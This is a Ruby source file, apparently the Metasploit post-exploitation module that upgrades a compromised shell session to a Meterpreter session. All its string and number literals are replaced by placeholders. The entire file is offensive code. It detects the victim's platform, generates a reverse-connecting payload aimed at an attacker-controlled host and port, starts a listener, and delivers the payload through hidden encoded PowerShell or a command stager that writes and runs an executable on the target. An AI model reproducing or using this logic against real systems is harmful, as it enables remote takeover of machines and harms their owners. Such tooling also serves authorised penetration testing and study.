require <str> require <str> require <str> require <str> class Metasploit3 < Msf :: Post include Exploit :: Powershell include Post :: Windows :: Powershell def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ <str> , <str> , <str> , <str> , <str> , <str> ] , <str> = > [ <str> ] ) ) register_options ( [ OptAddress . new ( <str> , [ false , <str> , nil ] ) , OptInt . new ( <str> , [ true , <str> , <int> ] ) , OptBool . new ( <str> , [ true , <str> , true ] ) ] , self . class ) register_advanced_options ( [ OptInt . new ( <str> , [ true , <str> , <int> ] ) , OptEnum . new ( <str> , [ true , <str> , <str> , [ <str> , <str> ] ] ) , OptString . new ( <str> , [ false , <str> , nil ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) ] , self . class ) deregister_options ( <str> , <str> , <str> ) end def run print_status ( <str> datastore [ <str> ] <str> ) if session . type =~ <str> print_error ( <str> ) return nil end if datastore [ <str> ] lhost = datastore [ <str> ] elsif framework . datastore [ <str> ] lhost = framework . datastore [ <str> ] else lhost = session . tunnel_local . split ( <str> ) [ <int> ] end lhost = Rex :: Socket . source_address if lhost . blank? lport = datastore [ <str> ] case session . platform when <str> platform = <str> payload_name = <str> lplat = [ Msf :: Platform :: Windows ] larch = [ ARCH_X86 ] psh_arch = <str> vprint_status ( <str> ) when <str> platform = <str> payload_name = <str> vprint_status ( <str> ) when <str> platform = <str> payload_name = <str> vprint_status ( <str> ) else target_info = cmd_exec ( <str> ) if target_info =~ <str> && target_info =~ <str> platform = <str> payload_name = <str> lplat = [ Msf :: Platform :: Linux ] larch = [ ARCH_X86 ] vprint_status ( <str> ) elsif target_info =~ <str> platform = <str> payload_name = <str> vprint_status ( <str> ) elsif cmd_exec ( <str> ) =~ <str> platform = <str> payload_name = <str> vprint_status ( <str> ) end end payload_name = datastore [ <str> ] if datastore [ <str> ] vprint_status ( <str> payload_name <str> ) if platform . blank? print_error ( <str> session . platform <str> ) return nil end payload_data = generate_payload ( lhost , lport , payload_name ) if payload_data . blank? print_error ( <str> session . platform <str> payload_name <str> ) return nil end if datastore [ <str> ] listener_job_id = create_multihandler ( lhost , lport , payload_name ) if listener_job_id . blank? print_error ( <str> datastore [ <str> ] <str> ) return nil end end case platform when <str> if session . type == <str> template_path = File . join ( Msf :: Config . data_directory , <str> , <str> ) psh_payload = case datastore [ <str> ] when <str> Rex :: Powershell :: Payload . to_win32pe_psh_net ( template_path , payload_data ) when <str> Rex :: Powershell :: Payload . to_win32pe_psh_reflection ( template_path , payload_data ) when <str> Rex :: Powershell :: Payload . to_win32pe_psh ( template_path , payload_data ) when <str> fail RuntimeError , <str> else fail RuntimeError , <str> end psh_payload = <str> << psh_payload encoded_psh_payload = encode_script ( psh_payload ) cmd_exec ( run_hidden_psh ( encoded_psh_payload , psh_arch , true ) ) else if ( have_powershell? ) && ( datastore [ <str> ] != <str> ) vprint_status ( <str> ) psh_opts = { <str> = > <int> , <str> = > true , <str> = > false } cmd_exec ( cmd_psh_payload ( payload_data , psh_arch , psh_opts ) ) else print_error ( <str> ) if datastore [ <str> ] == <str> vprint_status ( <str> ) exe = Msf :: Util :: EXE . to_executable ( framework , larch , lplat , payload_data ) aborted = transmit_payload ( exe ) end end when <str> vprint_status ( <str> ) cmd_exec ( <str> payload_data <str> ) else vprint_status ( <str> ) exe = Msf :: Util :: EXE . to_executable ( framework , larch , lplat , payload_data ) aborted = transmit_payload ( exe ) end if datastore [ <str> ] vprint_status ( <str> ) cleanup_handler ( listener_job_id , aborted ) end return nil end def transmit_payload ( exe ) linemax = <int> if ( session . exploit_datastore [ <str> ] ) linemax = session . exploit_datastore [ <str> ] . to_i end opts = { <str> = > linemax , } if session . platform =~ <str> opts [ <str> ] = File . join ( Msf :: Config . data_directory , <str> , <str> , <str> ) cmdstager = Rex :: Exploitation :: CmdStagerVBS . new ( exe ) else opts [ <str> ] = true opts [ <str> ] = datastore [ <str> ] opts [ <str> ] = datastore [ <str> ] cmdstager = Rex :: Exploitation :: CmdStagerBourne . new ( exe ) end cmds = cmdstager . generate ( opts ) if cmds . nil? || cmds . length < <int> print_error ( <str> ) raise ArgumentError end total_bytes = <int> cmds . each { | cmd | total_bytes += cmd . length } vprint_status ( <str> ) begin sent = <int> aborted = false cmds . each { | cmd | ret = cmd_exec ( cmd ) if ! ret aborted = true else ret . strip! aborted = true if ! ret . empty? && ret !~ <str> end if aborted print_error ( <str> + cmd . inspect ) print_error ( <str> + ret . inspect ) if ret && ! ret . empty? break end sent += cmd . length progress ( total_bytes , sent ) } rescue :: Interrupt aborted = true rescue = > e print_error ( <str> e <str> ) aborted = true end return aborted end def cleanup_handler ( listener_job_id , aborted ) return nil if framework . jobs [ listener_job_id ] . nil? framework . threads . spawn ( <str> , false ) { if ! aborted timer = <int> vprint_status ( <str> HANDLE_TIMEOUT <str> ) while ! framework . jobs [ listener_job_id ] . nil? && timer < HANDLE_TIMEOUT sleep ( <int> ) timer += <int> end end print_status ( <str> ) framework . jobs . stop_job ( listener_job_id ) } end def progress ( total , sent ) done = ( sent . to_f / total . to_f ) * <int> print_status ( <str> % [ done . to_f , sent , total ] ) end def check_for_listener ( lhost , lport ) client . framework . jobs . each do | k , j | if j . name =~ <str> current_id = j . jid current_lhost = j . ctx [ <int> ] . datastore [ <str> ] current_lport = j . ctx [ <int> ] . datastore [ <str> ] if lhost == current_lhost && lport == current_lport . to_i print_error ( <str> current_id <str> current_lhost <str> current_lport <str> ) return true end end end return false end def create_multihandler ( lhost , lport , payload_name ) pay = client . framework . payloads . create ( payload_name ) pay . datastore [ <str> ] = lhost pay . datastore [ <str> ] = lport print_status ( <str> ) if ! check_for_listener ( lhost , lport ) mh = client . framework . exploits . create ( <str> ) mh . share_datastore ( pay . datastore ) mh . datastore [ <str> ] = client . workspace mh . datastore [ <str> ] = payload_name mh . datastore [ <str> ] = <str> mh . datastore [ <str> ] = true mh . options . validate ( mh . datastore ) mh . exploit_simple ( <str> = > mh . datastore [ <str> ] , <str> = > self . user_input , <str> = > self . user_output , <str> = > true ) select ( nil , nil , nil , <int> ) return nil if framework . jobs [ mh . job_id . to_s ] . nil? return mh . job_id . to_s else print_error ( <str> ) return nil end end def generate_payload ( lhost , lport , payload_name ) payload = framework . payloads . create ( payload_name ) options = <str> lhost <str> lport <str> buf = payload . generate_simple ( <str> = > options ) buf end end 
